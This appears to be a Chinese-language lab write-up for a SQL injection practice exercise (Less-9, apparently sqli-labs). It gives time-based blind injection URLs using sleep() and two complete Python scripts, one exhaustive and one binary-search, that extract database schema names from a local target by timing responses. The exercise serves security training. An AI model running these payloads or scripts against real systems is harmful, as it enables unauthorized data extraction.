# Lesson-09
```
时间盲注-,-宽字节注入-,-Bool盲注
```

时间盲注
当时间盲注的时候 , 采用穷举的手法会比二分查找快很多
如果是基于BOOL的盲注 , 则二分查找更快一些
```
http://127.0.0.1/Less-9/?id=1
http://127.0.0.1/Less-9/?id=1'
http://127.0.0.1/Less-9/?id=1' and sleep(3)--+
http://127.0.0.1/Less-9/?id=1%27%20and%20(%271%27=%27%27%20or%20sleep(3))--+
http://127.0.0.1/Less-9/?id=1%27%20and%20(()%20or%20sleep(3))--+
```
穷举 : 
```
#!/usr/bin/env python
# encoding:utf8

import requests
import time
import sys

# config-start
sleep_time = 1
error_time = 0.1 # 误差范围
# config-end

def getPayload(indexOfResult, indexOfChar, queryASCII):
	column_name="schema_name"
	table_name="schemata"
	database_name="information_schema"
	startStr = "1' and ("
	endStr = ") or sleep(3))--+"
	payload = "((ascii(substring((select " + column_name + " from " + database_name + "." + table_name + "  limit " + indexOfResult + ",1)," + indexOfChar + ",1))!=" + queryASCII + ")"
	payload = startStr + payload + endStr
	return payload

def exce(indexOfResult,indexOfChar,queryASCII):
	# content-start
	url = "http://127.0.0.1/Less-9/?id="
	tempurl = url + getPayload(indexOfResult,indexOfChar,queryASCII)
	before_time = time.time()
	requests.head(tempurl)
	after_time = time.time()
	# content-end
	use_time = after_time - before_time
	# judge-start
	# 当sleep函数被执行 , 说明查询是正确的 (因为穷举毕竟错误的情况更多 , 要构造SQL语句让正确的情况执行sleep函数从而提高效率)
	# 当使用二分查找的时候 , 控制正确/错误的时候执行sleep函数就不那么重要了
	if abs(use_time) > error_time: 
		return True
	else:
		return False
	# judge-end

def doSearch(indexOfResult,indexOfChar):
	# 根据数据库中出现的字符的频率顺序重新构造列表进行查询
	order = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','_','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z',' ','!','"','#','$','%','&','\'','(',')','*','+',',','-','.','/','0','1','2','3','4','5','6','7','8','9',':',';','<','=','>','?','@','[','\\',']','^','`','{','|','}','~']
	for queryChar in order:
		queryASCII = ord(queryChar)
		if exce(str(indexOfResult),str(indexOfChar + 1), str(queryASCII)):
			return chr(queryASCII)
	return chr(1)

def search():
	for i in range(64): # 需要遍历的查询结果的数量
		counter = 0
		for j in range(128): # 结果的长度
			counter += 1
			temp = doSearch(i, j) # 从255开始查询
			if ord(temp) == 1: # 当为1的时候说明已经查询结束
			    break
			sys.stdout.write(temp)
			sys.stdout.flush()
		if counter == 1: # 当结果集的所有行都被遍历后退出
			break
		sys.stdout.write("\r\n")
		sys.stdout.flush()

search()
```
二分 :
```
#!/usr/bin/env python
# encoding:utf8

import requests
import time
import sys

# config-start
sleep_time = 1
error_time = 0.1 # 误差范围
# config-end

def getPayload(indexOfResult, indexOfChar, queryASCII):
	column_name="schema_name"
	table_name="schemata"
	database_name="information_schema"
	startStr = "1' and ("
	endStr = ") or sleep(3))--+"
	payload = "((ascii(substring((select " + column_name + " from " + database_name + "." + table_name + "  limit " + indexOfResult + ",1)," + indexOfChar + ",1))>" + queryASCII + ")"
	payload = startStr + payload + endStr
	return payload

def exce(indexOfResult,indexOfChar,mid):
	# content-start
	url = "http://127.0.0.1/Less-9/?id="
	tempurl = url + getPayload(indexOfResult,indexOfChar,mid)
	before_time = time.time()
	requests.head(tempurl)
	after_time = time.time()
	# content-end
	use_time = after_time - before_time
	# judge-start
	if abs(use_time) < error_time: 
		return True
	else:
		return False
	# judge-end

def doubleSearch(indexOfResult,indexOfChar,left_number, right_number):
	while left_number < right_number:
		mid = int((left_number + right_number) / 2)
		if exce(str(indexOfResult),str(indexOfChar + 1),str(mid)):
			left_number = mid
		else:
			right_number = mid
		if left_number == right_number - 1:
			if exce(str(indexOfResult),str(indexOfChar + 1),str(mid)):
				mid += 1
				break
			else:
				break
	return chr(mid)

def search():
	for i in range(32): # 需要遍历的查询结果的数量
		counter = 0
		for j in range(32): # 结果的长度
			counter += 1
			temp = doubleSearch(i, j, 0, 128) # 从255开始查询
			if ord(temp) == 1: # 当为1的时候说明已经查询结束
			    break
			sys.stdout.write(temp)
			sys.stdout.flush()
		if counter == 1: # 当结果集的所有行都被遍历后退出
			break
		sys.stdout.write("\r\n")
		sys.stdout.flush()

search()
```
